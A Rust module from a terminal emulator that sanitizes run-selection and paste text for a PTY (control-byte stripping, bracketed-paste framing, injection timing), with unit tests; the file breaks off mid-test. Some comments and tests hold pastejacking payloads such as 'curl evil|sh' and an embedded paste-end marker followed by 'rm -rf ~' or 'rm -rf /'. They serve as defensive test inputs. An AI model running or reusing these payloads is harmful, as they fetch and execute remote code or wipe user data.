//! Run-selection-in-a-new-tab core: sanitize → classify → pending-inject.
//!
//! The browser gesture transplanted: select text in a terminal → run it in a
//! new tab, the way a link opens in a new tab. This module is the PURE core —
//! no `App`, no `Tab`, no PTY, no winit — so every safety-critical rule
//! (control-byte stripping, the run-vs-type decision, injection readiness, the
//! exact wire bytes) is unit-testable against plain values and a `Vec<u8>`
//! writer. The `app.rs` glue stays a thin adapter.
//!
//! Safety model (paste-protection-grade):
//! * `sanitize` strips ESC and every control byte except `\n`/`\t`, so no
//!   selection can ever smuggle escape sequences (including the bracketed-paste
//!   END marker `ESC[201~`) to a PTY. 16 KiB cap; truncation forces Type mode.
//! * single line → RUN (bracketed, `\r` AFTER the close marker — the payload is
//!   inert data; only our own accept-line executes);
//! * multiline → TYPE (bracketed, NO `\r`): the shell's own paste buffer is the
//!   review step — the user's Enter is the confirmation, zero modal UI;
//! * multiline without bracketed paste is NEVER written raw (interior newlines
//!   would execute lines 1..n-1 immediately) — it waits, and is REFUSED at TTL;
//! * an UNBRACKETED write converts `\t` → space (a raw tab triggers readline
//!   completion, so the executed line could differ from the reviewed one) and
//!   is only ever single-line.

use std::borrow::Cow;
use std::io::Write;
use std::time::{Duration, Instant};

/// Hard cap on the sanitized selection (bytes). A selection this large is not a
/// command; truncation additionally forces Type mode so nothing truncated can
/// auto-run.
pub const MAX_BYTES: usize = 16 * 1024;

/// No-integration fallback: how long after tab creation a single-line Run may
/// fire UNBRACKETED when the source shell never emitted an OSC 133 mark.
pub const INJECT_TIMEOUT: Duration = Duration::from_millis(1500);

/// Absolute time-to-live of a pending inject. A drain that arrives later than
/// this must drop (single-line) or refuse-with-feedback (multiline), never
/// surprise-execute into a stale prompt.
pub const INJECT_TTL: Duration = Duration::from_secs(10);

/// `sanitize`'s output: the cleaned text plus whether the cap truncated it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Sanitized {
    pub text: String,
    pub truncated: bool,
}

/// Defense-in-depth cleaner for selection text bound for a PTY.
///
/// 1. `\r\n` and lone `\r` normalize to `\n`.
/// 2. Every `char::is_control()` except `\n` and `\t` is removed — that kills
///    ESC (so `ESC[201~` cannot survive), all C0, DEL, and the C1 range.
///    Unicode FORMAT codepoints (category Cf: ZWSP/ZWJ, bidi controls, U+FEFF,
///    soft hyphen) deliberately PASS: `is_control()` is Cc-only. They cannot
///    break the bracketed framing (only real ESC could) and carry no execution
///    semantics of their own — the exact exposure the ordinary paste path has
///    always had, kept identical on purpose rather than inventing a stricter
///    filter that would corrupt legitimate RTL/emoji-joined selections.
/// 3. The WHOLE text is trimmed (removes the trailing newline a full-line
///    selection always carries, so `cmd\n` classifies as a single line).
/// 4. Capped at [`MAX_BYTES`] on a char boundary; sets `truncated`.
pub fn sanitize(raw: &str) -> Sanitized {
    // Steps 1+2 in one pass: CR/CRLF → LF, then the control filter.
    let mut text = String::with_capacity(raw.len().min(MAX_BYTES + 8));
    let mut chars = raw.chars().peekable();
    while let Some(ch) = chars.next() {
        let ch = if ch == '\r' {
            if chars.peek() == Some(&'\n') {
                chars.next();
            }
            '\n'
        } else {
            ch
        };
        if !is_stripped_control(ch) {
            text.push(ch);
        }
    }
    // Step 3: whole-text trim.
    let trimmed = text.trim();
    // Step 4: cap at a char boundary.
    let mut truncated = false;
    let text = if trimmed.len() > MAX_BYTES {
        truncated = true;
        let cut = floor_char_boundary(trimmed, MAX_BYTES);
        // Re-trim the tail: the cut can expose trailing whitespace.
        trimmed[..cut].trim_end().to_string()
    } else {
        trimmed.to_string()
    };
    Sanitized { text, truncated }
}

/// Whether `ch` must never reach a PTY from pasted or injected text: every Cc
/// control — C0, DEL, C1 — except `\n` and `\t` (callers normalize `\r`
/// first). ESC is among them, so no payload can carry an escape sequence (the
/// bracketed-paste END marker included). Unicode FORMAT codepoints (Cf: ZWJ,
/// bidi marks, U+FEFF) pass — see [`sanitize`]. Shared by [`sanitize`] and
/// [`sanitize_paste`] so the run-selection and paste paths can't drift apart.
fn is_stripped_control(ch: char) -> bool {
    ch.is_control() && ch != '\n' && ch != '\t'
}

/// Clean clipboard text for a paste into a PTY. EVERY paste path — shortcut,
/// menu, palette, middle-click, detached windows — reaches the PTY through
/// `App::paste_to_tab` → [`paste_bytes`] → here.
///
/// Drops ESC and every other control character except `\t` and line breaks
/// ([`is_stripped_control`]). Bracketed paste alone does not make that safe:
/// the tty still turns `^C`/`^Z`/`^\` inside a paste into signals (ISIG), the
/// shell abandons the paste, and the bytes after the signal key arrive as
/// TYPED input — `echo hi^C⏎curl evil|sh⏎` ran its second line (reproduced on
/// bash 5.3 and zsh 5.9; the clipboard can be set by any web page, or by any
/// program in the terminal via OSC 52). With ESC gone the `ESC[201~` end
/// marker cannot be smuggled in either.
///
/// Line breaks: bracketed → `\r\n` and lone `\r` become `\n` (what a shell's
/// paste buffer expects); unbracketed → every line break becomes `\r`, the
/// Enter key — a CRLF pair would otherwise arrive as TWO line breaks (ICRNL
/// turns its CR into a second LF). Borrows unchanged when nothing needs
/// rewriting (the common case), so a normal paste pays no copy here.
pub fn sanitize_paste(text: &str, bracketed: bool) -> Cow<'_, str> {
    if !paste_needs_rewrite(text.as_bytes(), bracketed) {
        return Cow::Borrowed(text);
    }
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '\r' | '\n' => {
                if ch == '\r' && chars.peek() == Some(&'\n') {
                    chars.next();
                }
                out.push(if bracketed { '\n' } else { '\r' });
            }
            c if is_stripped_control(c) => {}
            c => out.push(c),
        }
    }
    Cow::Owned(out)
}

/// Byte-level fast check for [`sanitize_paste`]: a C0 control (other than
/// `\t` and the line break the mode keeps as-is), DEL, or a UTF-8-encoded C1
/// (`C2 80..=9F`; `C2 A0..` is ordinary text like NBSP).
fn paste_needs_rewrite(b: &[u8], bracketed: bool) -> bool {
    b.iter().enumerate().any(|(i, &c)| match c {
        b'\t' => false,
        b'\n' => !bracketed,
        b'\r' => bracketed,
        0x00..=0x1f | 0x7f => true,
        0xc2 => b.get(i + 1).is_some_and(|n| (0x80..=0x9f).contains(n)),
        _ => false,
    })
}

/// The exact bytes a paste writes to the PTY: [`sanitize_paste`]d text,
/// wrapped in `ESC[200~`…`ESC[201~` when the app enabled bracketed paste.
/// Empty when nothing survives (nothing is sent — not even the markers). One
/// buffer, so the framed paste reaches the PTY as a single ordered write.
pub fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
    let clean = sanitize_paste(text, bracketed);
    if clean.is_empty() {
        return Vec::new();
    }
    if !bracketed {
        return clean.into_owned().into_bytes();
    }
    let mut out = Vec::with_capacity(clean.len() + 12);
    out.extend_from_slice(b"\x1b[200~");
    out.extend_from_slice(clean.as_bytes());
    out.extend_from_slice(b"\x1b[201~");
    out
}

/// Everything a user paste does to its tab, Tab-free so it is testable: the
/// [`paste_bytes`] for `text` (bracketed when the program asked for it) go to
/// `w`, a staged run-selection inject is cancelled — the user claimed the
/// prompt — and the view jumps back to the live bottom, where the text lands
/// (a keystroke's rule, F30). Nothing survives sanitizing → nothing happens at
/// all. EVERY paste path (shortcut, menu, palette, middle click, dropped file,
/// detached windows) lands here through `App::paste_to_tab`. Returns whether
/// the view moved (the caller repaints: a no-echo prompt sends no output).
pub fn paste_into(
    term: &mut jetty_core::Terminal,
    pending: &mut Option<PendingInject>,
    w: &mut dyn Write,
    text: &str,
) -> bool {
    let bytes = paste_bytes(text, term.bracketed_paste());
    if bytes.is_empty() {
        return false;
    }
    cancel_on_user_write(pending);
    let moved = term.scroll_offset() != 0;
    term.scroll_to_bottom();
    let _ = w.write_all(&bytes);
    let _ = w.flush();
    moved
}

/// The run-vs-type decision over a sanitized selection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Plan {
    /// Nothing usable (empty / whitespace-only) — abort everywhere.
    Empty,
    /// Single line, not truncated: inject and follow with `\r` (runs).
    Run(String),
    /// Multiline or truncated: inject WITHOUT `\r` — the user reviews at the
    /// prompt and presses Enter themselves (the multiline-paste-protection
    /// analog). Whether it can be written at all is a FIRE-time decision
    /// (bracketed paste), not classify's.
    Type(String),
}

pub fn classify(s: Sanitized) -> Plan {
    if s.text.is_empty() {
        return Plan::Empty;
    }
    if s.truncated || s.text.contains('\n') {
        Plan::Type(s.text)
    } else {
        Plan::Run(s.text)
    }
}

/// Vertical box-drawing characters that TUI frames (Claude Code's bordered
/// blocks, `boxes`, `gum`…) put at the left/right edge of every framed row. A
/// selection that spans such rows drags the border in — and a command that
/// starts with `│` is never what the user meant to run.
const FRAME_CHARS: [char; 9] = ['│', '┃', '║', '┆', '┇', '┊', '┋', '╎', '╏'];

/// Strip UNIFORM, UNAMBIGUOUS decorations a real-terminal selection drags in,
/// so "select the command out of Claude Code's framed output and run it" works
/// without hand-editing. Every rule fires only when it holds on EVERY non-empty
/// line — a mixed selection is left byte-for-byte alone:
///
/// 1. A shared LEADING frame border (`│` etc. + optional one space) on every
///    line is stripped (Claude Code / boxed-TUI left edge) — also when the
///    frame sits a few columns in, provided every line after the first has
///    the same indentation before it (the first line's was trimmed away).
/// 2. A shared TRAILING frame border (optional spaces + `│` etc.) is stripped
///    (the right edge of a full-width frame selection).
/// 3. A shared doc-style PROMPT marker `"$ "` or `"❯ "` on every line is
///    stripped ONCE (the way docs and shell transcripts prefix commands —
///    `echo $PATH` is untouched: `$` there is not followed by a space-prefixed
///    token start on every line).
///
/// Runs AFTER [`sanitize`] (on clean, trimmed text — stripping only shrinks, so
/// the cap holds) and re-trims. Pure; byte-exact tests below.
pub fn strip_decorations(text: &str) -> String {
    let non_empty = |l: &&str| !l.trim().is_empty();
    let mut out: Vec<String> = text.lines().map(str::to_string).collect();

    // 1. Uniform leading frame char (+ at most one following space). The frame
    //    may sit a few columns in: the first line's indentation is already gone
    //    (sanitize trims the whole text), every later line must carry the SAME
    //    indentation before the border — one frame column, or nothing strips.
    if let Some(first) = out.iter().find(|l| non_empty(&l.as_str())) {
        if let Some(f) = first.trim_start().chars().next().filter(|c| FRAME_CHARS.contains(c)) {
            let indent = |l: &str| l.len() - l.trim_start().len();
            let mut later = out.iter().filter(|l| non_empty(&l.as_str())).skip(1);
            let col = later.clone().next().map_or(0, |l| indent(l));
            if later.all(|l| indent(l) == col && l[col..].starts_with(f)) {
                for l in &mut out {
                    let body = l.trim_start();
                    if let Some(rest) = body.strip_prefix(f) {
                        *l = rest.strip_prefix(' ').unwrap_or(rest).to_string();
                    }
                }
            }
        }
    }
    // 2. Uniform trailing frame char (spaces before it allowed).
    if let Some(first) = out.iter().find(|l| non_empty(&l.as_str())) {
        if let Some(f) = first.trim_end().chars().last().filter(|c| FRAME_CHARS.contains(c)) {
            if out
                .iter()
                .filter(|l| non_empty(&l.as_str()))
                .all(|l| l.trim_end().ends_with(f))
            {
                for l in &mut out {
                    let t = l.trim_end();
                    if let Some(rest) = t.strip_suffix(f) {
                        *l = rest.trim_end().to_string();
                    }
                }
            }
        }
    }
    // 3. Uniform doc-style prompt marker on every line.
    for marker in ["$ ", "❯ "] {
        if out.iter().filter(|l| non_empty(&l.as_str())).all(|l| l.trim_start().starts_with(marker))
            && out.iter().any(|l| non_empty(&l.as_str()))
        {
            for l in &mut out {
                let lead: String = l.chars().take_while(|c| c.is_whitespace()).collect();
                if let Some(rest) = l.trim_start().strip_prefix(marker) {
                    *l = format!("{lead}{rest}");
                }
            }
        }
    }
    out.join("\n").trim().to_string()
}

/// [`sanitize`] + [`strip_decorations`] — the full selection→command pipeline
/// the app runs before [`classify`]. Kept as one seam so every trigger path
/// (menu, chord, palette, copy-mode, detached) prepares text identically.
pub fn prepare(raw: &str) -> Sanitized {
    let s = sanitize(raw);
    Sanitized { text: strip_decorations(&s.text), truncated: s.truncated }
}

/// A command staged for injection into a freshly-spawned tab, waiting for the
/// destination shell to become ready. Lives in `Tab.pending_inject`
/// (`Option`, `None` for every tab that never uses the feature — the zero-cost
/// invariant) and carries its OWN deadlines (per-tab, so two concurrent
/// pendings never starve each other).
pub struct PendingInject {
    /// Sanitized text (never contains ESC/C0/C1 other than `\n`/`\t`).
    pub text: String,
    /// `true` = Run mode (append `\r` after the close marker), `false` = Type.
    pub run: bool,
    /// Creation instant; both the timeout and the TTL are measured from here.
    pub created: Instant,
    /// Adaptive readiness policy: `true` when the SOURCE shell had emitted at
    /// least one OSC 133 A mark (integration present — the new tab runs the
    /// same configured shell, so we wait for mark + bracketed-paste and never
    /// take the blind timeout).
    pub wait_for_mark: bool,
    /// The window that hosted the trigger, for feedback pills (refusal /
    /// staged notice). `None` = main window.
    pub notify_window: Option<winit::window::WindowId>,
}

impl PendingInject {
    /// Interior `\n` ⇒ an unbracketed write is never safe for this pending.
    pub fn multiline(&self) -> bool {
        self.text.contains('\n')
    }

    /// The next instant `poll_pending` could change its verdict without any
    /// PTY traffic — the `about_to_wait` wake deadline for this pending.
    /// Single-line no-integration pendings wake at the unbracketed-fire
    /// timeout; everything else waits out the TTL.
    pub fn deadline(&self) -> Instant {
        if !self.wait_for_mark && !self.multiline() && self.run {
            self.created + INJECT_TIMEOUT
        } else {
            self.created + INJECT_TTL
        }
    }
}

/// User-facing feedback produced by servicing a pending inject, surfaced as a
/// themed status pill in `window` (`None`/stale id = the main window).
pub struct Notice {
    pub msg: &'static str,
    pub window: Option<winit::window::WindowId>,
}

/// Pill text when a multiline pending expired without bracketed paste — the
/// tab is open at the right cwd; only the injection was withheld.
pub const MSG_REFUSED: &str =
    "Multi-line run needs bracketed paste — tab opened, paste manually";

/// Pill text when a Type-mode pending landed staged (multiline or truncated):
/// nothing ran; the user's Enter is the confirmation.
pub const MSG_STAGED: &str = "Selection staged — review, then press Enter to run";

/// Pill text when a single-line pending hit its TTL — the tab is open at the
/// right cwd, but nothing ran and nothing will (a late fire is forbidden).
/// Without this the user sees an open tab and no clue why it is empty.
pub const MSG_DROPPED: &str = "Run selection timed out — nothing was run";

/// `poll_pending`'s verdict for one pending at one instant.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// Not ready yet, not expired — keep waiting.
    Wait,
    /// The destination shell is ready (prompt mark seen AND bracketed paste
    /// on): fire BRACKETED.
    Fire,
    /// No-integration fallback: single-line only, after [`INJECT_TIMEOUT`] —
    /// fire UNBRACKETED (`\t` → space applies).
    FireUnbracketed,
    /// TTL expired on a single-line pending — drop silently (never fire late).
    Drop,
    /// TTL expired on a MULTILINE pending that never got bracketed paste —
    /// drop AND tell the user (the tab is open at the right cwd; they paste
    /// manually).
    Refuse,
}

/// The pure readiness state machine (BLOCKING 1 as amended):
///
/// * Readiness for a bracketed fire is `prompt_count > 0 && bracketed_on` —
///   BOTH, for single-line too. On zsh the `?2004h` arrival is the true "zle
///   is interactive" signal; p10k's instant prompt emits its A mark hundreds
///   of ms earlier, while bracketed paste is still off — firing (or refusing
///   multiline) at that first mark would break the flagship config.
/// * The blind-timeout fallback exists only for integration-less shells
///   (`!wait_for_mark`) and only for single-line Run — a raw single line with
///   zero interior `\n` is bounded, and `\t` is converted at write time.
/// * TTL is checked FIRST: a drain arriving 10 s late must never fire.
pub fn poll_pending(
    p: &PendingInject,
    now: Instant,
    prompt_count: u64,
    bracketed_on: bool,
) -> Verdict {
    if now.duration_since(p.created) >= INJECT_TTL {
        return if p.multiline() { Verdict::Refuse } else { Verdict::Drop };
    }
    if prompt_count > 0 && bracketed_on {
        return Verdict::Fire;
    }
    if !p.wait_for_mark && now.duration_since(p.created) >= INJECT_TIMEOUT {
        // Integration-less fallback, OPPORTUNISTICALLY bracketed: marks will
        // never come, but zsh/bash/fish still enable `?2004h` at their prompt —
        // when it is on by the timeout, a bracketed fire is strictly safer than
        // raw AND lets a multiline stage here instead of refusing at TTL. The
        // raw path stays single-line-run only (`\t` → space at write time).
        if bracketed_on {
            return Verdict::Fire;
        }
        if !p.multiline() && p.run {
            return Verdict::FireUnbracketed;
        }
    }
    Verdict::Wait
}

/// Write a staged command to `w` — the Tab-free fire core (BLOCKING 6).
///
/// Wire format (mirrors `paste_to_tab`):
/// * `bracketed`: `ESC[200~` + payload (embedded `ESC[201~` stripped — cannot
///   occur post-sanitize, kept as the last-writer invariant) + `ESC[201~`,
///   then `\r` AFTER the close marker when `run` — exactly one accept-line,
///   and the payload itself stays inert data.
/// * unbracketed: single-line ONLY (multiline returns `false` and writes
///   NOTHING — defense in depth; the caller's verdict already forbids it),
///   with every `\t` converted to a single space so readline completion can
///   never rewrite the reviewed line; `\r` appended when `run`.
///
/// Returns `Ok(true)` when bytes were written, `Ok(false)` when the write was
/// refused (unbracketed multiline).
pub fn fire_pending(
    w: &mut dyn Write,
    text: &str,
    run: bool,
    bracketed: bool,
) -> std::io::Result<bool> {
    if bracketed {
        w.write_all(b"\x1b[200~")?;
        w.write_all(&strip_paste_end(text.as_bytes()))?;
        w.write_all(b"\x1b[201~")?;
        if run {
            w.write_all(b"\r")?;
        }
    } else {
        if text.contains('\n') {
            return Ok(false); // never write raw interior newlines
        }
        let safe: String = text.replace('\t', " ");
        w.write_all(safe.as_bytes())?;
        if run {
            w.write_all(b"\r")?;
        }
    }
    w.flush()?;
    Ok(true)
}

/// Cancel a pending inject because a USER-originated byte is about to be
/// written to the destination tab's PTY (keystroke, IME commit, paste,
/// menu-Clear, wheel→arrow synthesis). One helper so every funnel shares the
/// rule — and so the rule is unit-testable without a `Tab`.
#[inline]
pub fn cancel_on_user_write(p: &mut Option<PendingInject>) {
    if p.is_some() {
        *p = None;
    }
}

/// Remove every embedded bracketed-paste END marker (`ESC[201~`), checking the
/// OUTPUT tail after each byte so a marker cannot re-form across a removed one.
/// Borrows unchanged when absent (the always case post-sanitize).
fn strip_paste_end(bytes: &[u8]) -> std::borrow::Cow<'_, [u8]> {
    const END: &[u8] = b"\x1b[201~";
    if bytes.len() < END.len() || !bytes.windows(END.len()).any(|w| w == END) {
        return std::borrow::Cow::Borrowed(bytes);
    }
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    for &b in bytes {
        out.push(b);
        if out.ends_with(END) {
            out.truncate(out.len() - END.len());
        }
    }
    std::borrow::Cow::Owned(out)
}

/// Largest byte index `<= max` that is a char boundary of `s` (stable stand-in
/// for the unstable `str::floor_char_boundary`).
fn floor_char_boundary(s: &str, max: usize) -> usize {
    if s.len() <= max {
        return s.len();
    }
    let mut b = max;
    while b > 0 && !s.is_char_boundary(b) {
        b -= 1;
    }
    b
}

// ---------------------------------------------------------------------------
// Unit tests — pure values and Vec<u8> writers only (no shell, no PTY, no
// window, no clipboard: rule 4).
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ── sanitize ─────────────────────────────────────────────────────────────

    // ── strip_decorations (the select-from-framed-TUI-output path) ────────────

    #[test]
    fn strip_frame_left_border_single_and_multi() {
        assert_eq!(strip_decorations("│ cargo build"), "cargo build");
        assert_eq!(strip_decorations("│ line1\n│ line2"), "line1\nline2");
        // No space after the border is fine too.
        assert_eq!(strip_decorations("│cargo build"), "cargo build");
    }

    #[test]
    fn strip_frame_right_border_full_width_selection() {
        assert_eq!(strip_decorations("│ cargo build        │"), "cargo build");
        assert_eq!(strip_decorations("│ a   │\n│ b │"), "a\nb");
    }

    #[test]
    fn strip_frame_left_border_of_an_indented_frame() {
        // A box drawn two columns in, triple-clicked: sanitize trims only the
        // whole text, so the lines after the first keep the indentation before
        // the border — which then never stripped (the left border, then the
        // right, ended up in the command).
        let raw = "  │ cargo build   │\n  │ cargo test    │\n";
        assert_eq!(prepare(raw).text, "cargo build\ncargo test");
        assert_eq!(strip_decorations("│ line1\n  │ line2"), "line1\nline2");
        assert_eq!(strip_decorations("  │ line1\n  │ line2"), "line1\nline2");
        // Indentation INSIDE the frame is content and survives.
        assert_eq!(strip_decorations("│ if x:\n  │     y"), "if x:\n    y");
        // Still uniform-only: a line without the border, or a border at a
        // different column, leaves everything alone.
        assert_eq!(strip_decorations("│ a\n  b"), "│ a\n  b");
        assert_eq!(strip_decorations("│ a\n  │ b\n    │ c"), "│ a\n  │ b\n    │ c");
    }

    #[test]
    fn strip_frame_only_when_uniform() {
        // Mixed starts: left alone byte-for-byte (minus the outer trim, a no-op here).
        assert_eq!(strip_decorations("│ a\nb"), "│ a\nb");
        // Border NOT at line start: untouched.
        assert_eq!(strip_decorations("echo │ x"), "echo │ x");
    }

    #[test]
    fn strip_doc_prompt_markers() {
        assert_eq!(strip_decorations("$ cargo build"), "cargo build");
        assert_eq!(strip_decorations("❯ ls -la"), "ls -la");
        // Uniform across a transcript block.
        assert_eq!(strip_decorations("$ cmd1\n$ cmd2"), "cmd1\ncmd2");
        // `$` not followed by space = real shell text, untouched.
        assert_eq!(strip_decorations("echo $PATH"), "echo $PATH");
        // Mixed prompt/non-prompt lines: untouched.
        assert_eq!(strip_decorations("$ a\nplain"), "$ a\nplain");
    }

    #[test]
    fn strip_frame_then_prompt_composes() {
        // Claude-Code-style framed transcript: border first, then the prompt.
        assert_eq!(strip_decorations("│ $ cargo build │"), "cargo build");
    }

    #[test]
    fn prepare_pipeline_still_single_line_run() {
        // The full seam: sanitize (controls/trim) + decorations → classify Run.
        let p = classify(prepare("  │ $ cargo \x1b[31mbuild\x1b[0m │  \n"));
        assert_eq!(p, Plan::Run("cargo [31mbuild[0m".into()));
    }

    // ── paste ────────────────────────────────────────────────────────────────

    #[test]
    fn paste_plain_text_borrows_unchanged() {
        // The common case pays no copy: tabs and the mode's own line break pass.
        let s = "echo hello\nworld\t! — ğüşıöç İ 🚀\u{a0}nbsp";
        assert!(matches!(sanitize_paste(s, true), Cow::Borrowed(_)));
        let one_line = "git commit -m \"wip\"\t# ok";
        assert!(matches!(sanitize_paste(one_line, false), Cow::Borrowed(_)));
        assert!(matches!(sanitize_paste("a\rb", false), Cow::Borrowed(_)), "lone CR is Enter already");
    }

    #[test]
    fn paste_signal_keys_cannot_split_a_paste_into_typed_commands() {
        // The reproduced pastejacking payloads: ^C / ^Z / ^\ inside a bracketed
        // paste made the shell abandon the paste and run the next line. They
        // must reach the PTY as inert text inside one intact frame.
        for sig in ['\x03', '\x1a', '\x1c'] {
            let payload = format!("echo harmless{sig}\ncurl evil|sh\n");
            assert_eq!(
                paste_bytes(&payload, true),
                b"\x1b[200~echo harmless\ncurl evil|sh\n\x1b[201~".to_vec(),
                "signal key {:#04x} survived",
                sig as u32
            );
        }
    }

    #[test]
    fn paste_drops_every_control_except_tab_and_line_breaks() {
        let s = "a\x00b\x07c\x08d\x1be\x7ff\u{80}g\u{9b}h\u{9f}i\tj\nk";
        assert_eq!(sanitize_paste(s, true), "abcdefghi\tj\nk");
        // Unicode format characters are text, not controls: they pass.
        let fmt = "a\u{200d}b\u{200f}c\u{feff}d";
        assert_eq!(sanitize_paste(fmt, true), fmt);
    }

    #[test]
    fn paste_cannot_forge_the_bracketed_end_marker() {
        // The classic injection, and a crafted re-forming variant: with ESC gone
        // the ONLY end marker on the wire is our own closing one.
        for payload in ["a\x1b[201~rm -rf ~\n", "\x1b[2\x1b[201~01~", "\x1b[201~x\x1b[201~y\x1b[201~"] {
            let bytes = paste_bytes(payload, true);
            let end = b"\x1b[201~";
            let n = bytes.windows(end.len()).filter(|w| w == end).count();
            assert_eq!(n, 1, "payload {payload:?} → {bytes:?}");
            assert!(bytes.ends_with(end));
            assert_eq!(bytes.iter().filter(|&&b| b == 0x1b).count(), 2, "only the two frame ESCs");
        }
        assert_eq!(paste_bytes("a\x1b[201~rm -rf ~\n", true), b"\x1b[200~a[201~rm -rf ~\n\x1b[201~");
    }

    #[test]
    fn paste_line_breaks_follow_the_mode() {
        // Bracketed: the shell's paste buffer wants LF; CRLF / lone CR → LF.
        assert_eq!(sanitize_paste("a\r\nb\rc\nd", true), "a\nb\nc\nd");
        // Unbracketed: every line break is the Enter key, exactly once — a CRLF
        // must not become two (ICRNL would turn its CR into a second LF).
        assert_eq!(sanitize_paste("a\r\nb\rc\nd", false), "a\rb\rc\rd");
        assert_eq!(paste_bytes("ls\r\n", false), b"ls\r".to_vec());
    }

    #[test]
    fn a_paste_jumps_back_to_the_prompt() {
        // Scrolled back into history, a paste went to the prompt off-screen
        // and the view stayed put — a keystroke jumps to the live bottom
        // (F30); a paste is typing too.
        let mut t = jetty_core::Terminal::new(20, 5);
        for i in 0..50 {
            t.feed(format!("line {i}\r\n").as_bytes());
        }
        t.scroll_lines(10);
        assert!(t.scroll_offset() > 0);
        let mut slot = Some(pending("echo hi", true, Instant::now(), true));
        let mut w: Vec<u8> = Vec::new();
        assert!(paste_into(&mut t, &mut slot, &mut w, "ls -la"), "the view moved");
        assert_eq!(w, b"ls -la");
        assert_eq!(t.scroll_offset(), 0, "the view follows the paste to the prompt");
        assert!(slot.is_none(), "the paste claimed the prompt");
        // Bracketed when the program asked for it.
        t.feed(b"\x1b[?2004h");
        w.clear();
        assert!(!paste_into(&mut t, &mut None, &mut w, "a\nb"), "already at the bottom");
        assert_eq!(w, b"\x1b[200~a\nb\x1b[201~");
        // Nothing survives sanitizing: nothing is written, nothing moves.
        t.scroll_lines(10);
        w.clear();
        assert!(!paste_into(&mut t, &mut None, &mut w, "\x03\x1b"));
        assert!(w.is_empty());
        assert!(t.scroll_offset() > 0);
    }

    #[test]
    fn paste_of_nothing_but_controls_sends_nothing() {
        assert!(paste_bytes("\x03\x1b\x1a", true).is_empty(), "no empty frame either");
        assert!(paste_bytes("", false).is_empty());
    }

    #[test]
    fn sanitize_strips_esc_c0_c1_del_keeps_nl_tab() {
        let s = sanitize("a\x1b[31mb\x07c\x00d\u{7f}e\u{9b}f\tg\nh");
        assert_eq!(s.text, "a[31mbcdef\tg\nh", "ESC/C0/C1/DEL gone; \\t and \\n kept");
        assert!(!s.truncated);
    }

    #[test]
    fn sanitize_kills_embedded_bracketed_paste_end_marker() {
        // The classic paste injection: an embedded ESC[201~ would end the
        // bracketed guard early and run the remainder as typed commands.
        // Sanitize strips the ESC, leaving the inert literal `[201~`.
        let s = sanitize("safe\x1b[201~rm -rf /");
        assert!(!s.text.contains('\x1b'), "no ESC byte survives");
        assert_eq!(s.text, "safe[201~rm -rf /");
    }

    #[test]
    fn sanitize_normalizes_crlf_and_lone_cr() {
        assert_eq!(sanitize("a\r\nb").text, "a\nb");
        assert_eq!(sanitize("a\rb").text, "a\nb");
        assert_eq!(sanitize("a\r\r\nb").text, "a\n\nb");
    }

    #[test]
    fn sanitize_trims_whole_text() {
        assert_eq!(sanitize("  echo hi \n").text, "echo hi");
        assert_eq!(sanitize("\n\n  \t \n").text, "");
        // Interior whitespace is preserved verbatim.
        assert_eq!(sanitize(" a  b ").text, "a  b");
    }

    #[test]
    fn sanitize_caps_at_char_boundary_and_flags_truncated() {
        // 16 KiB of 'a' plus a tail — cut exactly at the cap.
        let raw = "a".repeat(MAX_BYTES + 100);
        let s = sanitize(&raw);
        assert!(s.truncated);
        assert_eq!(s.text.len(), MAX_BYTES);
        // Multibyte at the boundary: 'é' is 2 bytes; a string of 'é' has no
        // boundary AT MAX_BYTES if it is odd-aligned — the cut must land on a
        // char boundary and never panic.
        let raw = "é".repeat(MAX_BYTES); // 2 × MAX_BYTES bytes
        let s = sanitize(&raw);
        assert!(s.truncated);
        assert!(s.text.len() <= MAX_BYTES);
        assert!(s.text.is_char_boundary(s.text.len()));
    }

    #[test]
    fn sanitize_under_cap_not_truncated() {
        let s = sanitize(&"a".repeat(MAX_BYTES));
        assert!(!s.truncated);
        assert_eq!(s.text.len(), MAX_BYTES);
    }

    // ── classify (byte-exact per the amendment) ──────────────────────────────

    #[test]
    fn classify_single_line_runs() {
        assert_eq!(classify(sanitize("echo hi")), Plan::Run("echo hi".into()));
    }

    #[test]
    fn classify_trailing_newline_is_still_single_line() {
        // A full-line mouse selection carries `\n` — must classify SINGLE and
        // never double-fire.
        assert_eq!(classify(sanitize("cmd\n")), Plan::Run("cmd".into()));
        assert_eq!(classify(sanitize("cmd")), Plan::Run("cmd".into()));
    }

    #[test]
    fn classify_interior_newline_types() {
        assert_eq!(classify(sanitize("a\nb")), Plan::Type("a\nb".into()));
        assert_eq!(classify(sanitize("a\nb\n")), Plan::Type("a\nb".into()));
    }

    #[test]
    fn classify_truncated_forces_type_even_single_line() {
        let s = Sanitized { text: "echo hi".into(), truncated: true };
        assert_eq!(classify(s), Plan::Type("echo hi".into()));
    }

    #[test]
    fn classify_empty_and_whitespace_only() {
        assert_eq!(classify(sanitize("")), Plan::Empty);
        assert_eq!(classify(sanitize("   \n\t \n")), Plan::Empty);
    }

    // ── poll_pending ─────────────────────────────────────────────────────────

    fn pending(text: &str, run: bool, created: Instant, wait_for_mark: bool) -> PendingInject {
        PendingInject {
            text: text.to_string(),
            run,
            created,
            wait_for_mark,
            notify_window: None,
        }
    }

    #[test]
    fn poll_fires_bracketed_on_mark_plus_2004() {
        let t0 = Instant::now();
        let p = pending("echo hi", true, t0, true);
        assert_eq!(poll_pending(&p, t0, 1, true), Verdict::Fire);
        // Multiline too — readiness is the same both-signals gate.
        let m = pending("a\nb", false, t0, true);
        assert_eq!(poll_pending(&m, t0, 1, true), Verdict::Fire);
    }

    #[test]
    fn poll_waits_on_mark_without_2004_p10k_instant_prompt() {
        // p10k instant prompt: A mark seen, ?2004h not yet — must WAIT (never
        // fire into the limbo, never refuse multiline at first-A).
        let t0 = Instant::now();
        let p = pending("echo hi", true, t0, true);
        assert_eq!(poll_pending(&p, t0, 1, false), Verdict::Wait);
        let m = pending("a\nb", false, t0, true);
        assert_eq!(poll_pending(&m, t0, 1, false), Verdict::Wait);
    }

    #[test]
    fn poll_waits_on_2004_without_mark_when_integration_expected() {
        let t0 = Instant::now();
        let p = pending("echo hi", true, t0, true);
